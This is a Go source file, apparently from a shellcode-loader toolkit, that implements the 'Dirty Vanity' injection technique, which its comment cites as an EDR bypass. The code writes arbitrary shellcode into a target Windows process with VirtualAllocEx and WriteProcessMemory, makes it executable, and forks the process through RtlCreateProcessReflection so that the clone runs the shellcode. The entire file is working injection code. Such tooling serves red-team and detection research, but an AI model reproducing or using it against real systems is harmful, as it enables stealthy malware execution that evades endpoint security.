package loaders

import (
	"fmt"
	"github.com/ma111e/moonboots/internal/consts"
	"github.com/ma111e/moonboots/internal/defs"
	"github.com/ma111e/moonboots/internal/win32"
	log "github.com/sirupsen/logrus"
	"golang.org/x/sys/windows"
	"unsafe"
)

/*
This technique executes shellcode in a remote process using the following steps
+ Allocate and write shellcode to target PID
+ Fork target PID to a new process
+ Set the forked process's start address to the cloned shellcode

For some reasons standard shellcodes fails with this technique. The DeepInstinct POC shellcode (x64, spawns "cmd /k msg * Hello from Dirty Vanity") is generated by the https://github.com/rainerzufalldererste/windows_x64_shellcode_template project, that seems to booststrap it in a way that work with this technique.


> References:
+ https://www.deepinstinct.com/blog/dirty-vanity-a-new-approach-to-code-injection-edr-bypass
+ https://github.com/deepinstinct/Dirty-Vanity
*/
const (
	LdrDirtyVanity = "dirtyvanity"
)

type DirtyVanityLoader struct {
	Base
}

func init() {
	ldr := &DirtyVanityLoader{}
	ldr.SuspendProcess = true
	ldr.Injector = true

	AvailableLoaders.Register(LdrDirtyVanity, ldr)
}

func (ldr DirtyVanityLoader) ValidArchs() []string {
	return consts.VALID_ARCH_BOTH
}

func (ldr DirtyVanityLoader) Run(shellcode []byte) error {
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	ntdll := windows.NewLazySystemDLL("ntdll.dll")

	VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
	VirtualProtectEx := kernel32.NewProc("VirtualProtectEx")
	WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")

	RtlCreateProcessReflection := ntdll.NewProc("RtlCreateProcessReflection")

	log.Printf("Successfully got a handle to process %d", ldr.TargetProcess.ProcessId)

	log.Debugf("Calling VirtualAllocEx on PID %d...", ldr.TargetProcess.ProcessId)

	addr, _, err := VirtualAllocEx.Call(uintptr(ldr.TargetProcess.Process), 0, uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	if err != nil && err != windows.ERROR_SUCCESS {
		return fmt.Errorf("Error calling VirtualAlloc: %s", err)
	}

	if addr == 0 {
		return fmt.Errorf("VirtualAllocEx failed and returned 0")
	}

	log.Printf("Successfully allocated memory in PID %d", ldr.TargetProcess.ProcessId)

	log.Debugf("Calling WriteProcessMemory on PID %d...", ldr.TargetProcess.ProcessId)
	_, _, err = WriteProcessMemory.Call(uintptr(ldr.TargetProcess.Process), addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))

	if err != nil && err != windows.ERROR_SUCCESS {
		return fmt.Errorf("Error calling WriteProcessMemory: %s", err)
	}

	log.Printf("Successfully wrote shellcode to PID %d", ldr.TargetProcess.ProcessId)

	log.Debugf("Calling VirtualProtectEx on PID %d...", ldr.TargetProcess.ProcessId)

	oldProtect := windows.PAGE_READWRITE
	_, _, err = VirtualProtectEx.Call(uintptr(ldr.TargetProcess.Process), addr, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
	if err != nil && err != windows.ERROR_SUCCESS {
		return fmt.Errorf("Error calling VirtualProtectEx: %s", err)
	}

	log.Printf("Successfully change memory permissions to PAGE_EXECUTE_READ in PID %d", ldr.TargetProcess.ProcessId)

	log.Debugf("Call RtlCreateProcessReflection on PID %d...", ldr.TargetProcess.ProcessId)

	info := defs.T_RTLP_PROCESS_REFLECTION_REFLECTION_INFORMATION{
		ReflectionClientId: defs.T_CLIENT_ID{},
	}

	_, _, err = RtlCreateProcessReflection.Call(uintptr(ldr.TargetProcess.Process), defs.RTL_CLONE_PROCESS_FLAGS_INHERIT_HANDLES|defs.RTL_CLONE_PROCESS_FLAGS_NO_SYNCHRONIZE, addr, win32.Null, win32.Null, uintptr(unsafe.Pointer(&info)))
	if err != nil && err != windows.ERROR_SUCCESS {
		return fmt.Errorf("Error calling RtlCreateProcessReflection: %s", err)
	}

	log.Printf("Reflection successful, created PID %d", info.ReflectionClientId.UniqueProcess)

	return nil
}
